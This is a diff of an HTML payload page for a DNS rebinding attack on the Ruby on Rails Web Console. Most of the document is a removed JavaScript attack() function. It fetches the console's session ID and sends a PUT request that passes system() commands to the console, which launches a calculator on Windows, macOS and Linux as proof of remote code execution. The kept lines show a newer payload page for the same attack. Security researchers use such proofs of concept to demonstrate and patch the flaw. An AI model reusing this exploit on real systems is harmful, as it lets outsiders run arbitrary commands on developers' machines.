@@ -13,88 +13,6 @@ The default RPC port for the rails web console is TCP 3000 (127.0.0.1:3000)
 	<title>Ruby on Rails Web Console DNS Rebinding Attack</title>
 	<script src="payload.js"></script>
 	<script>
-		var timer;
-		var interval = 60000;
-		var address;
-
-		function attack() {
-			let myHeaders = new Headers();
-			/* /not_found : Send a GET request to get the console session ID */
-			fetch('/', {
-					method: 'GET'
-				})
-				.then(responseOKOrFail("Could not submit a request to the rails console"))
-				.then(function (d) { // we successfully received data
-					/* /__web_console/repl_sessions/{SESSION-ID} : Send a PUT request to run the calculator app */
-					match = d.match(/data-session-id='([^']+)'/);
-					var path;
-					if (match != null) {
-						console.log("data-session-id is " + match[1]);
-						path = "/__web_console/repl_sessions/" + match[1];
-					} else {
-						console.log("did not see the rails console sessionid");
-						// Did not see rails web console. Maybe DNS rebinding did not happen. Let's wait for the next time.
-						throw new Error('hastoken');
-					}
-					myHeaders.append("Accept", "application/vnd.web-console.v2");
-					myHeaders.append("X-Requested-With", "XMLHttpRequest");
-					myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
-					return fetch(path, {
-						method: 'PUT',
-						headers: myHeaders,
-						//body: "input=system(%22calc%22)" // Windows
-						//body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%22)" // OSX
-						//body: "input=system(%22xcalc%26%22)" // Linux (the & (%26) is to execute the command in the background)
-						body: "input=system(%22open%20%2fApplications%2fCalculator.app%26xcalc%26%22)" // OSX & Linux combined ("open /Applications/Calculator.app&xcalc&")
-					})
-
-				})
-				.then(responseOKOrFail("Could not submit a request to the rails console"))
-				.then(function (d) { // we successfully received the response
-					clearInterval(timer);
-					attackSuccess("Calculator executed");
-				})
-				.catch(function (error) {
-					if (error instanceof TypeError) { // We cannot establish an HTTP connection
-						console.log("frame " + window.location.hostname + " could not load");
-						window.parent.postMessage({
-							status: "error",
-						}, "*");
-					} else if (error.message == 'hastoken') {
-						console.log('DNS rebinding did not happen yet')
-					} else if (error.message == '404') { // We received a 404
-						console.log("file not found. Frame " + window.location.hostname +
-							" has not updated dns yet, waiting " + interval +
-							" ms")
-					} else { // We did not handle something
-						console.log('Unhandled error: ' + error);
-						window.parent.postMessage({
-							status: "error",
-						}, "*");
-					}
-				});
-		}
-	</script>
-</head>
-
-<body onload="begin()">
-	<p>
-		<h3>DNS Rebinding Vulnerability in Ruby on Rails Web Console</h3>
-	</p>
-	<p>
-		This page is waiting for a dns update.
-	</p>
-</body>
-
-</html>
----
-<!doctype html>
-<html>
-
-<head>
-	<title>Ruby on Rails Web Console DNS Rebinding Attack</title>
-	<script src="payload.js"></script>
-	<script>
 		// attack() is called once DNS rebinding is successful
 		// headers and body contains server data obtained 
 		// from the victim service during rebinding, if any.
@@ -131,5 +49,4 @@ The default RPC port for the rails web console is TCP 3000 (127.0.0.1:3000)
 	<h3>Ruby on Rails Web Console Payload</h3>
 	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
 </body>
-
 </html>
